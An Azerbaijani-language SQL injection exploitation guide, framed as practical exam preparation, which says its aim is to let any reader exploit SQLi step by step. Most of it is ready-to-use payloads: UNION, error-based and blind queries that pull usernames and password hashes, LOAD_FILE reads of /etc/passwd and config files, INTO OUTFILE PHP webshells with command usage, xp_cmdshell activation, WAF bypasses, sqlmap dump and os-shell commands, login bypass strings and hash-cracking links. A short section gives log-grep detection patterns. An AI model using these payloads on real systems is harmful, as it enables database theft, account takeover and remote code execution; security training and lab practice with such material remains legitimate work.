# 🗄️ SQL Injection (SQLi) — Tam Eksploytasiya Bələdçisi

> **İmtahan Formatı:** Praktiki | **Mövzu:** Web Exploitation — SQL Injection  
> **Məqsəd:** Bu sənədi oxuyan istənilən şəxs SQLi boşluğunu addım-addım exploit edə bilsin.

---

## 📑 Məzmun

1. [SQLi Nədir? — Konseptual İzah](#1-sqli-nədir--konseptual-izah)
2. [Hücum Növləri — Tam Xəritə](#2-hücum-növləri--tam-xəritə)
3. [Zəifliyin Aşkarlanması (Detection)](#3-zəifliyin-aşkarlanması-detection)
4. [Union-Based SQLi — Addım-addım](#4-union-based-sqli--addım-addım)
5. [Error-Based SQLi](#5-error-based-sqli)
6. [Blind SQLi — Boolean & Time-Based](#6-blind-sqli--boolean--time-based)
7. [Qabaqcıl Texnikalar (LOAD_FILE, Webshell)](#7-qabaqcıl-texnikalar-load_file-webshell)
8. [WAF Bypass Üsulları](#8-waf-bypass-üsulları)
9. [SQLMap — Avtomatlaşdırılmış Eksploytasiya](#9-sqlmap--avtomatlaşdırılmış-eksploytasiya)
10. [Auth Bypass (Giriş Paneli)](#10-auth-bypass-giriş-paneli)
11. [Verilənlər Bazasına Görə Fərqlər (MySQL / PostgreSQL / MSSQL)](#11-verilənlər-bazasına-görə-fərqlər)
12. [Forensic — Log-da SQLi İzlərini Tapmaq](#12-forensic--log-da-sqli-izlərini-tapmaq)
13. [Faydalı Saytlar & Alətlər](#13-faydalı-saytlar--alətlər)
14. [Quick Reference — Bütün Payload-lar Bir Yerdə](#14-quick-reference--bütün-payload-lar-bir-yerdə)

---

## 1. SQLi Nədir? — Konseptual İzah

### Əsas İdea

Veb tətbiqlər istifadəçidən aldıqları girişi (input) SQL sorğusuna birləşdirdikdə, hücumçu bu girişi elə şəkildə manipulyasiya edə bilər ki, orijinal SQL sorğusunun məntiqi dəyişsin.

**Zəif kod nümunəsi (PHP):**

```php
$id = $_GET['id'];
$query = "SELECT * FROM products WHERE id = '$id'";
```

**Normal istifadəçi:** `?id=1` → `SELECT * FROM products WHERE id = '1'`

**Hücumçu:** `?id=1' OR '1'='1` → `SELECT * FROM products WHERE id = '1' OR '1'='1'`

Nəticə: `OR '1'='1'` həmişə doğru olduğundan bütün məhsullar qaytarılır.

### SQLi-nin Yarandığı Nöqtələr

| Nöqtə | Nümunə |
|---|---|
| URL parametrləri (GET) | `?id=1`, `?search=test`, `?category=books` |
| Form sahələri (POST) | Login, axtarış, şərh formaları |
| Cookie dəyərləri | `Cookie: user_id=5` |
| HTTP Başlıqları | `User-Agent`, `X-Forwarded-For`, `Referer` |
| JSON/XML body | API sorğuları |

---

## 2. Hücum Növləri — Tam Xəritə

```
SQL Injection
├── In-Band (Nəticə ekranda görünür)
│   ├── Union-Based   → UNION SELECT ilə məlumat çıxarma
│   └── Error-Based   → Xəta mesajında məlumat sızdırma
│
├── Blind (Nəticə görünmür, cavab analiz edilir)
│   ├── Boolean-Based → True/False cavabına görə
│   └── Time-Based    → SLEEP() funksiyası ilə gecikməyə görə
│
└── Out-of-Band (OOB)
    └── DNS/HTTP vasitəsilə kənar serverə məlumat göndərmə
```

**Hansını seçim?**

| Vəziyyət | Metod |
|---|---|
| Məlumat ekranda görünür | Union-Based |
| Xəta mesajı ekrana çıxır | Error-Based |
| Heç bir məlumat görünmür, lakin True/False fərqi var | Boolean-Based |
| Heç bir fərq yoxdur | Time-Based |
| Çox ciddi filtrləmə var | OOB |

---

## 3. Zəifliyin Aşkarlanması (Detection)

### Addım 1: Sındırıcı Simvollar Göndər

URL-dəki parametrə və ya form sahəsinə bunları əlavə et:

```
'
''
`
')
"))
' OR '1'='1
' OR 1=1--
" OR "1"="1
```

**Reaksiyaların mənası:**

| Reaksiya | Mənası |
|---|---|
| `SQL syntax error` xətası ekranda görünür | Zəiflik var, Error-Based ola bilər |
| Səhifə tamamilə boşalır / məzmun itir | Zəiflik var (Blind ola bilər) |
| Əlavə məlumat gəlir (iki nəticə əvəzinə çox) | Zəiflik var, Union-Based mümkündür |
| Heç nə dəyişmir | Ya zəiflik yoxdur, ya da filtrləmə var |

### Addım 2: Məntiqi Test

```
?id=1 AND 1=1   → Səhifə normal yüklənir (doğru şərt)
?id=1 AND 1=2   → Səhifə boş gəlir (yalan şərt)
```

Əgər bu ikisi arasında fərq varsa — **Blind Boolean SQLi** mövcuddur.

### Addım 3: Gecikməni Test Et (Time-Based)

```
?id=1' AND SLEEP(5)-- -
```

Səhifə 5 saniyə gec yüklənirsə — **Time-Based SQLi** mövcuddur.

---

## 4. Union-Based SQLi — Addım-addım

> 🎯 **Nə vaxt istifadə olunur?** Sorğunun nəticəsi ekranda görünəndə.

### Ümumi Konsept

`UNION` operatoru iki `SELECT` sorğusunun nəticəsini bir yerdə birləşdirir. Bunun işləməsi üçün:
1. Hər iki sorğunun **sütun sayı eyni** olmalıdır.
2. Sütunların **məlumat növü** uyğun olmalıdır.

---

### Addım A: Sütun Sayını Tap

**Metod 1 — ORDER BY (Tövsiyə olunur):**

`ORDER BY` sütun nömrəsinə görə sıralayır. Mövcud olmayan nömrə verilsə xəta verir.

```sql
' ORDER BY 1-- -     ✅ Uğurlu
' ORDER BY 2-- -     ✅ Uğurlu
' ORDER BY 3-- -     ✅ Uğurlu
' ORDER BY 4-- -     ❌ XƏTA → Deməli 3 sütun var
```

**Metod 2 — UNION SELECT ilə:**

```sql
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -   ✅ UĞURLU → 3 sütun var
```

> 💡 **Niyə NULL?** Hər məlumat növü ilə uyğunlaşır. Rəqəm, mətn fərq etmir.

> 💡 **Şərh sintaksisi:**
> - MySQL: `-- -` (tire, tire, boşluq, tire) və ya `#`
> - PostgreSQL/MSSQL: `--`

---

### Addım B: Hansı Sütun Ekranda Görünür? (Reflection Point)

Orijinal sorğunun nəticəsini gizlətmək üçün ID-ni mənfi edirik (`-1` və ya `999`), sonra rəqəmləri yerləşdiririk:

```sql
-1' UNION SELECT 1,2,3-- -
```

Ekranda hansı rəqəm görünürsə (məs. `2` görünür), növbəti bütün payload-larımızda `2`-nin yerinə öz komandamızı yazacağıq.

---

### Addım C: Sistem Məlumatlarını Çıxar

Tutaq ki, `2`-ci sütun ekranda görünür:

```sql
-- Cari verilənlər bazasının adı
-1' UNION SELECT 1,database(),3-- -

-- Cari istifadəçi
-1' UNION SELECT 1,user(),3-- -

-- MySQL versiyası
-1' UNION SELECT 1,version(),3-- -

-- Bazanın qovluğu
-1' UNION SELECT 1,@@datadir,3-- -

-- Əməliyyat sistemi
-1' UNION SELECT 1,@@global.version_compile_os,3-- -
```

---

### Addım D: Cədvəl Adlarını Tap (Table Enumeration)

`information_schema` — MySQL-in daxili sistemi. Bütün cədvəl adlarını saxlayır.

```sql
-- Cari bazadakı bütün cədvəllər
-1' UNION SELECT 1,table_name,3
FROM information_schema.tables
WHERE table_schema=database()-- -

-- Bütün bazalardakı cədvəllər (geniş axtarış)
-1' UNION SELECT 1,table_name,3
FROM information_schema.tables-- -

-- Bütün bazaların adları
-1' UNION SELECT 1,schema_name,3
FROM information_schema.schemata-- -
```

> 🔍 **Nəyə diqqət et?** `users`, `admin`, `accounts`, `credentials`, `members` kimi cədvəllər.

---

### Addım E: Sütun Adlarını Tap (Column Enumeration)

Tutaq ki, `users` cədvəlini tapdıq:

```sql
-- users cədvəlinin bütün sütunları
-1' UNION SELECT 1,column_name,3
FROM information_schema.columns
WHERE table_name='users'
AND table_schema=database()-- -
```

> 🔍 **Nəyə diqqət et?** `password`, `passwd`, `pwd`, `hash`, `secret`, `token`, `api_key`

---

### Addım F: Məlumatları Çıxar (Data Exfiltration)

```sql
-- username və password-u birlikdə göstər
-1' UNION SELECT 1,username,password FROM users-- -

-- Bütün sətirləri tək sətirdə birləşdir (group_concat)
-1' UNION SELECT 1,group_concat(username,':',password SEPARATOR '\n'),3 FROM users-- -

-- Daha oxunaqlı format
-1' UNION SELECT 1,group_concat(id,'-',username,':',password),3 FROM users-- -
```

**`group_concat()` niyə faydalıdır?** Çünki çox tətbiq yalnız bir sətir göstərir. Bu funksiya bütün nəticələri bir sətrə sıxır.

**Nəticə nümunəsi:**
```
1-admin:5f4dcc3b5aa765d61d8327d,2-john:8d3a5b7c2e1f9a0b,3-jane:abc123
```

---

## 5. Error-Based SQLi

> 🎯 **Nə vaxt istifadə olunur?** Məlumat ekranda görünmür, amma SQL xəta mesajları göstərilir.

### Əsas İdea

Bazanı qəsdən elə bir xətaya məcbur edirik ki, xəta mesajının içinə bizim istədiyimiz məlumatlar daxil olsun.

### MySQL — UpdateXML Metodu

```sql
-- Cari bazanın adı
' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)-- -
-- Gözlənilən xəta: XPATH syntax error: '~mydb~'

-- İstifadəçi adı
' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)-- -

-- Versiya
' AND updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)-- -

-- Cədvəl adları
' AND updatexml(1,concat(0x7e,(SELECT table_name FROM information_schema.tables
  WHERE table_schema=database() LIMIT 0,1),0x7e),1)-- -
-- LIMIT 0,1 → birinci cədvəl; LIMIT 1,1 → ikinci cədvəl

-- Şifrələri çıxar
' AND updatexml(1,concat(0x7e,(SELECT password FROM users LIMIT 0,1),0x7e),1)-- -
```

### MySQL — ExtractValue Metodu

```sql
' AND extractvalue(1,concat(0x7e,(SELECT database())))-- -
' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name)
  FROM information_schema.tables WHERE table_schema=database())))-- -
```

> 💡 **`0x7e` nədir?** `~` simvolunun Hex qarşılığıdır. Xəta mesajında məlumatı daha asan görməyə kömək edir.

> ⚠️ **Məlumat limiti:** `updatexml` yalnız **32 simvol** göstərir. Uzun nəticələr üçün `SUBSTRING` istifadə et:
> ```sql
> ' AND updatexml(1,concat(0x7e,SUBSTRING((SELECT password FROM users LIMIT 0,1),1,30),0x7e),1)-- -
> ```

---

## 6. Blind SQLi — Boolean & Time-Based

> 🎯 **Nə vaxt istifadə olunur?** Nə məlumat, nə xəta ekranda görünmür.

### A. Boolean-Based Blind SQLi

**Əsas Konsept:** Şərt doğrudursa (`True`) səhifə bir cür, yalandırsa (`False`) başqa cür yüklənir. Bu fərqdən istifadə edərək hərfləri tək-tək tapırıq.

```sql
-- Bazanın adının ilk hərfi 'a'dır?
' AND SUBSTRING(database(),1,1)='a'-- -

-- İlk hərf 'm'dir?
' AND SUBSTRING(database(),1,1)='m'-- -
-- Əgər True → bəli, 'm'dir

-- ASCII kodu ilə yoxlamaq (daha sürətli Burp Intruder üçün)
' AND ASCII(SUBSTRING(database(),1,1))>90-- -   -- 90-dan böyük?
' AND ASCII(SUBSTRING(database(),1,1))=109-- -  -- tam 109 (='m')?

-- Admin şifrəsinin ilk hərfini tap
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'-- -
```

**`SUBSTRING(string, start, length)` sintaksisi:**
- `SUBSTRING(database(),1,1)` → bazanın adının 1-ci hərfindən 1 hərf al
- `SUBSTRING(database(),2,1)` → 2-ci hərf
- `SUBSTRING(database(),1,3)` → ilk 3 hərf

**Burp Suite Intruder ilə sürətləndirmə:**
1. Payload-u Burp-ə göndər → Send to Intruder
2. Position: `ASCII(SUBSTRING(database(),1,1))=§109§`
3. Payload: Numbers → 32-dan 126-ya qədər (ASCII cədvəli)
4. Grep match: səhifənin True cavabına uyğun mətn

---

### B. Time-Based Blind SQLi

**Əsas Konsept:** Şərt doğrudursa verilənlər bazası `SLEEP()` ilə gözləyir. Gecikməni HTTP cavabında ölçürük.

```sql
-- Sadə test: SQLi var?
' AND SLEEP(5)-- -                    -- 5 saniyə gec cavab verəcək

-- MySQL: şərtli yoxlama
' AND IF(1=1, SLEEP(5), 0)-- -        -- həmişə gözləyir (test)
' AND IF(1=2, SLEEP(5), 0)-- -        -- gözləmir (yalan şərt)

-- Bazanın adının ilk hərfi 'a'dır?
' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0)-- -

-- Versiya 8 ilə başlayır?
' AND IF(version() LIKE '8%', SLEEP(5), 0)-- -

-- PostgreSQL
'; SELECT pg_sleep(5)-- -
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END-- -

-- MSSQL
'; WAITFOR DELAY '0:0:5'-- -
'; IF(1=1) WAITFOR DELAY '0:0:5'-- -
```

> ⚠️ **Diqqət:** Time-Based çox yavaş metoddur. 1 hərfi tapmaq üçün 7 sorğu lazım ola bilər (Binary Search ilə). SQLMap-dən istifadə et!

---

## 7. Qabaqcıl Texnikalar (LOAD_FILE, Webshell)

### A. Lokal Fayl Oxumaq (LOAD_FILE)

```sql
-- /etc/passwd faylını oxu
-1' UNION SELECT 1, load_file('/etc/passwd'), 3-- -

-- MySQL konfiqurasiyanı oxu
-1' UNION SELECT 1, load_file('/etc/mysql/mysql.conf.d/mysqld.cnf'), 3-- -

-- PHP konfiqurasiyası
-1' UNION SELECT 1, load_file('/etc/php/php.ini'), 3-- -

-- Web tətbiqinin source code-nu oxu
-1' UNION SELECT 1, load_file('/var/www/html/config.php'), 3-- -
-1' UNION SELECT 1, load_file('/var/www/html/db.php'), 3-- -
```

**Şərtlər:**
- MySQL `FILE` icazəsi olmalıdır (`SHOW GRANTS` ilə yoxla)
- `secure_file_priv` boş olmalı, yaxud hədəf qovluğa icazə olmalıdır
- Fayl MySQL prosesinin oxuya biləcəyi icazədə olmalıdır

---

### B. Serverə Fayl Yazmaq & RCE (INTO OUTFILE)

```sql
-- PHP webshell yaz
-1' UNION SELECT 1,
'<?php system($_GET["cmd"]); ?>',
3
INTO OUTFILE '/var/www/html/shell.php'-- -

-- Daha güclü webshell
-1' UNION SELECT 1,
'<?php if(isset($_GET["cmd"])){echo "<pre>".shell_exec($_GET["cmd"])."</pre>";}?>',
3
INTO OUTFILE '/var/www/html/shell.php'-- -
```

**Webshell-i istifadə etmək:**
```
http://target.com/shell.php?cmd=id
http://target.com/shell.php?cmd=whoami
http://target.com/shell.php?cmd=cat /etc/passwd
http://target.com/shell.php?cmd=ls /var/www/html
```

**Şərtlər:**
- MySQL `FILE` icazəsi olmalıdır
- Web root-a yazma icazəsi olmalıdır (Linux-da çox vaxt yoxdur)
- `secure_file_priv` konfiqurasiyanı bloklamır ola bilər

**Web root-u tapmaq:**
```sql
-- phpinfo faylına bax
-1' UNION SELECT 1, load_file('/var/www/html/index.php'), 3-- -

-- MySQL-dən öyrən
-1' UNION SELECT 1, @@datadir, 3-- -
-1' UNION SELECT 1, @@basedir, 3-- -
```

---

## 8. WAF Bypass Üsulları

### A. Boşluq (Space) Filtrlərini Keç

```sql
-- Normal:
UNION SELECT 1,2,3

-- Bypass variantları:
UNION/**/SELECT/**/1,2,3          -- Şərh bloku boşluq kimi
UNION%09SELECT%091,2,3            -- Tab simvolu (URL encoded)
UNION%0ASELECT%0A1,2,3            -- Yeni sətir (URL encoded)
UNION(SELECT(1),(2),(3))          -- Mötərizə ilə
```

### B. Açar Söz Filtrini Keç (Böyük/Kiçik Hərf)

```sql
-- Normal:
SELECT UNION

-- Bypass:
SeLeCt UnIoN
UNION SELECT
UniOn SeLeCt
```

### C. İkiqat Yazılış (Double Keyword) Bypass

```sql
-- Filtr 'union' sözünü tapıb silirsə:
uniunionon selectselect   -- silindikdən sonra 'union select' qalır

-- Tam payload nümunəsi:
' UNunionION SELselectECT 1,2,3-- -
```

### D. Dırnaq İşarəsiz String Göndərmək

```sql
-- Orijinal:
WHERE username='admin'

-- Hex ilə:
WHERE username=0x61646d696e   -- 'admin' → hex

-- String çevirmə (Python):
'admin'.encode().hex()  # → '61646d696e'
```

### E. URL Encoding

```sql
-- Normal:
' OR 1=1-- -

-- URL encoded:
%27%20OR%201%3D1--%20-

-- Double URL encoded:
%2527%2520OR%25201%253D1
```

### F. HTTP Parameter Pollution (HPP)

```
?id=1&id=2    -- Bəzi sistemlər yalnız birini götürür
```

### G. Inline Comments

```sql
' UN/**/ION SE/**/LECT 1,2,3-- -
```

---

## 9. SQLMap — Avtomatlaşdırılmış Eksploytasiya

> 🛠️ **Quraşdırma:** `pip install sqlmap` və ya `apt install sqlmap`

### A. Əsas İstifadə

```bash
# GET parametrindən
sqlmap -u "http://target.com/item.php?id=1" --batch

# POST parametrindən
sqlmap -u "http://target.com/login.php" --data="user=admin&pass=test" --batch

# Burp Suite-dən tutulmuş sorğu faylı ilə (ƏN YAXŞI METOD)
# 1. Burp-də sorğunu sağ klik → Save item → request.txt olaraq qeyd et
# 2. SQLMap-ə ver:
sqlmap -r request.txt --batch
```

### B. Məlumat Çıxarma Komandaları

```bash
# Bütün bazaları siyahıla
sqlmap -r request.txt --dbs --batch

# Seçilmiş bazanın cədvəllərini siyahıla
sqlmap -r request.txt -D hedef_baza --tables --batch

# Cədvəlin sütunlarını göstər
sqlmap -r request.txt -D hedef_baza -T users --columns --batch

# Cədvəlin bütün məlumatlarını çıxar
sqlmap -r request.txt -D hedef_baza -T users --dump --batch

# Yalnız müəyyən sütunları çıxar
sqlmap -r request.txt -D hedef_baza -T users -C username,password --dump --batch
```

### C. Güc Artırma Flags

```bash
# Yoxlama dərəcəsini artır (daha çox payload)
sqlmap -r request.txt --level=5 --risk=3 --batch

# WAF bypass üçün tamper skriptlər
sqlmap -r request.txt --tamper=space2comment --batch        # Boşluqları /**/ edir
sqlmap -r request.txt --tamper=charencode --batch           # URL encode edir
sqlmap -r request.txt --tamper=randomcase --batch           # Böyük/kiçik hərfə çevirir
sqlmap -r request.txt --tamper=between --batch              # > yerinə NOT BETWEEN
sqlmap -r request.txt --tamper=space2comment,charencode --batch  # Kombinə

# Cookie ilə (session tələb olunan hallarda)
sqlmap -r request.txt --cookie="session=abc123" --batch

# Proxy vasitəsilə (Burp Proxy)
sqlmap -r request.txt --proxy="http://127.0.0.1:8080" --batch
```

### D. RCE (Remote Code Execution)

```bash
# OS Shell əldə et (MySQL root icazəsi lazımdır)
sqlmap -r request.txt --os-shell --batch

# Fayl yüklə
sqlmap -r request.txt --file-read="/etc/passwd"
sqlmap -r request.txt --file-write="shell.php" --file-dest="/var/www/html/shell.php"
```

### E. Sürüşdürmə Üçün Faydalı Flags

```bash
--forms          # Formları avtomatik tap
--crawl=2        # Saytı crawl et (2 səviyyə dərinliyə)
--random-agent   # Təsadüfi User-Agent
--tor            # Tor şəbəkəsindən istifadə
--threads=5      # Paralel sorğu sayı
--technique=T    # Yalnız Time-based (U=Union, E=Error, B=Boolean, T=Time, S=Stacked)
```

---

## 10. Auth Bypass (Giriş Paneli)

> 🎯 **Hədəf:** İstifadəçi adı/şifrə yoxlanması olmadan sisteme daxil ol.

### Klassik Payload-lar

```sql
-- Username sahəsinə (şifrəni boş burax və ya istənilən şey yaz)
admin'-- -
admin'#
admin'/*

-- Username və ya password sahəsinə
' OR 1=1-- -
' OR '1'='1
' OR 'x'='x

-- Admin kimi daxil ol
admin' OR '1'='1'-- -
admin'-- -
admin')-- -

-- İlk istifadəçi kimi daxil ol
' OR 1=1 LIMIT 1-- -
```

### Nümunə: Giriş Forması

```
URL: http://target.com/login
Username: admin'-- -
Password: (istənilən şey)
```

SQL sorğusu bu şəklə düşür:
```sql
SELECT * FROM users WHERE username='admin'-- -' AND password='anything'
-- Şərh operatoru password yoxlanmasını ləğv edir!
```

### UNION ilə Saxtalaşdırılmış Sessiya

```sql
-- Tətbiq SELECT ilə istifadəçini yoxlayırsa:
' UNION SELECT 'admin','admin@test.com','hashed_pass',1-- -
```

---

## 11. Verilənlər Bazasına Görə Fərqlər

| Funksiya | MySQL | PostgreSQL | MSSQL | Oracle |
|---|---|---|---|---|
| Versiya | `@@version` / `version()` | `version()` | `@@version` | `v$version` |
| Cari baza | `database()` | `current_database()` | `db_name()` | `ora_database_name` |
| Cari istifadəçi | `user()` | `current_user` | `system_user` | `user` |
| String birləşdirmə | `concat(a,b)` | `a\|\|b` | `a+b` | `a\|\|b` |
| Şərh | `-- -` / `#` | `--` | `--` | `--` |
| Gecikdirmə | `SLEEP(5)` | `pg_sleep(5)` | `WAITFOR DELAY '0:0:5'` | `dbms_pipe.receive_message(('a'),5)` |
| Fayl oxuma | `load_file()` | `pg_read_file()` | `BULK INSERT` | — |
| Sistem cədvəlləri | `information_schema` | `information_schema` | `sys.tables` | `all_tables` |

### PostgreSQL Spesifik

```sql
-- Cədvəlləri tap
-1 UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema='public'-- -

-- İstifadəçilər
-1 UNION SELECT usename,passwd,3 FROM pg_shadow-- -

-- COPY vasitəsilə fayl oxuma (superuser lazımdır)
COPY (SELECT '') TO '/tmp/output.txt'
```

### MSSQL Spesifik

```sql
-- Cədvəlləri tap
-1 UNION SELECT name,2,3 FROM sys.tables-- -

-- Bütün bazalar
-1 UNION SELECT name,2,3 FROM sys.databases-- -

-- xp_cmdshell ilə RCE (sa icazəsi lazımdır)
'; EXEC xp_cmdshell 'whoami'-- -

-- xp_cmdshell aktiv etmək
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE-- -
```

---

## 12. Forensic — Log-da SQLi İzlərini Tapmaq

```bash
# SQL açar sözlərini tap
grep -iE "union|select|insert|drop|sleep|benchmark|load_file|into outfile" access.log

# URL-encoded SQL izləri
grep -iE "%27|%22|%3D|%20or%20|%20union%20|%20select%20" access.log

# Şərh simvolları
grep -iE "--|%2D%2D|#|%23|/\*" access.log

# Specific tools (sqlmap izləri)
grep -iE "sqlmap|nikto|acunetix|havij" access.log
grep -ic "sqlmap" access.log

# 500 xətalı sorğular (injection cəhdi əlaməti)
grep " 500 " access.log | grep -iE "id=|search=|user="

# Bir IP-dən çox sorğu
cut -d' ' -f1 access.log | sort | uniq -c | sort -rn | head -20
```

---

## 13. Faydalı Saytlar & Alətlər

### 🌐 Məşq Platformaları

| Sayt | Məzmun |
|---|---|
| [PortSwigger Web Security Academy](https://portswigger.net/web-security/sql-injection) | Ən ətraflı SQLi dərslikləri + praktiki lab-lar |
| [HackTheBox](https://www.hackthebox.com) | Real ssenarilərlə SQLi maşınları |
| [TryHackMe](https://tryhackme.com) | Yeni başlayanlar üçün əla SQLi room-lar |
| [DVWA](https://dvwa.co.uk) | Qəsdən zəif tətbiq (lokal quraşdır) |
| [SQLi-labs](https://github.com/Audi-1/sqli-labs) | 65 müxtəlif SQLi ssenari |
| [HackThisSite](https://www.hackthissite.org) | SQLi challenge-lar |

### 🛠️ Alətlər

| Alət | Məqsəd | Link |
|---|---|---|
| **SQLMap** | Avtomatlaşdırılmış SQLi exploit | `sqlmap -r request.txt` |
| **Burp Suite** | HTTP sorğuları tut, dəyiş, göndər | [portswigger.net/burp](https://portswigger.net/burp) |
| **HackBar** | Brauzerdə sürətli payload test | Firefox/Chrome extension |
| **Havij** (qadağalı) | Windows SQLi aləti | — |

### 📚 Referans Saytlar

| Sayt | Məzmun |
|---|---|
| [PayloadsAllTheThings — SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection) | Hər növ SQLi üçün payload kolleksiyası |
| [OWASP SQLi](https://owasp.org/www-community/attacks/SQL_Injection) | Rəsmi OWASP izahı |
| [PentestMonkey MySQL SQLi Cheatsheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet) | MySQL üçün ən populyar reference |
| [PortSwigger SQLi Cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) | Bütün DB növlərini əhatə edir |
| [HackTricks SQLi](https://book.hacktricks.xyz/pentesting-web/sql-injection) | Geniş taktiki izah |

### 🔐 Şifrə Kırma (Hash Crackle)

| Sayt | Məzmun |
|---|---|
| [CrackStation](https://crackstation.net) | Hash-i yapışdır, şifrəni al (MD5, SHA1, bcrypt) |
| [Hashes.com](https://hashes.com) | Böyük hash lookup verilənlər bazası |
| [HashKiller](https://hashkiller.io) | Çoxlu hash növləri |
| `hashcat` | Lokal güclü hash kraker |
| `john` (John the Ripper) | Klassik şifrə kıran |

---

## 14. Quick Reference — Bütün Payload-lar Bir Yerdə

```sql
-- ===== DETECTION =====
'                                   -- Sındırıcı simvol
' OR 1=1-- -                        -- Məntiqi bypass
' AND 1=2-- -                       -- False şərt (fərqə bax)
' AND SLEEP(5)-- -                  -- Time test

-- ===== COLUMN COUNT =====
' ORDER BY 1-- -                    -- 1-dən artır, xətaya qədər
' UNION SELECT NULL-- -             -- NULL ilə yoxla
' UNION SELECT NULL,NULL,NULL-- -   -- 3 sütun varsa uğurlu

-- ===== REFLECTION POINT =====
-1' UNION SELECT 1,2,3-- -         -- Hansı rəqəm ekranda?

-- ===== FINGERPRINTING =====
-1' UNION SELECT 1,database(),3-- -
-1' UNION SELECT 1,user(),3-- -
-1' UNION SELECT 1,version(),3-- -
-1' UNION SELECT 1,@@datadir,3-- -

-- ===== TABLE ENUM =====
-1' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()-- -
-1' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -

-- ===== COLUMN ENUM =====
-1' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- -
-1' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -

-- ===== DATA EXTRACTION =====
-1' UNION SELECT 1,username,3 FROM users-- -
-1' UNION SELECT 1,group_concat(username,':',password),3 FROM users-- -

-- ===== ERROR-BASED =====
' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)-- -
' AND updatexml(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e),1)-- -
' AND extractvalue(1,concat(0x7e,(SELECT database())))-- -

-- ===== BOOLEAN BLIND =====
' AND SUBSTRING(database(),1,1)='a'-- -
' AND ASCII(SUBSTRING(database(),1,1))=109-- -
' AND (SELECT COUNT(*) FROM users)>0-- -

-- ===== TIME BLIND =====
' AND SLEEP(5)-- -
' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)-- -
' AND IF(1=1,SLEEP(5),0)-- -

-- ===== FILE READ =====
-1' UNION SELECT 1,load_file('/etc/passwd'),3-- -
-1' UNION SELECT 1,load_file('/var/www/html/config.php'),3-- -

-- ===== WEBSHELL =====
-1' UNION SELECT 1,'<?php system($_GET["cmd"]); ?>',3 INTO OUTFILE '/var/www/html/shell.php'-- -

-- ===== AUTH BYPASS =====
admin'-- -
' OR 1=1-- -
' OR '1'='1'-- -
admin' OR '1'='1'-- -

-- ===== WAF BYPASS =====
UNION/**/SELECT/**/1,2,3
UNunionION SELselectECT 1,2,3
' OR 1=1%23
0x61646d696e     -- 'admin' hex ilə

-- ===== SQLMAP =====
sqlmap -r request.txt --batch
sqlmap -r request.txt --dbs --batch
sqlmap -r request.txt -D db_adi --tables --batch
sqlmap -r request.txt -D db_adi -T users --dump --batch
sqlmap -r request.txt --level=5 --risk=3 --tamper=space2comment --batch
sqlmap -r request.txt --os-shell --batch
```

---

## 🔁 Eksploytasiya Axını (Ümumi Ardıcıllıq)

```
1. Zəifliyi tap        → ' əlavə et, xəta/fərq var?
        ↓
2. Növü müəyyənlər     → Union? Error? Blind?
        ↓
3. Sütun sayını tap    → ORDER BY / UNION NULL
        ↓
4. Reflection point    → -1' UNION SELECT 1,2,3
        ↓
5. Bazanı öyrən        → database(), user(), version()
        ↓
6. Cədvəlləri tap      → information_schema.tables
        ↓
7. Sütunları tap       → information_schema.columns
        ↓
8. Məlumatı çıxar      → group_concat(username,':',password)
        ↓
9. Hash-i kır           → CrackStation / hashcat
        ↓
10. Sisteme daxil ol   → Əldə edilmiş credentials ilə
```

---
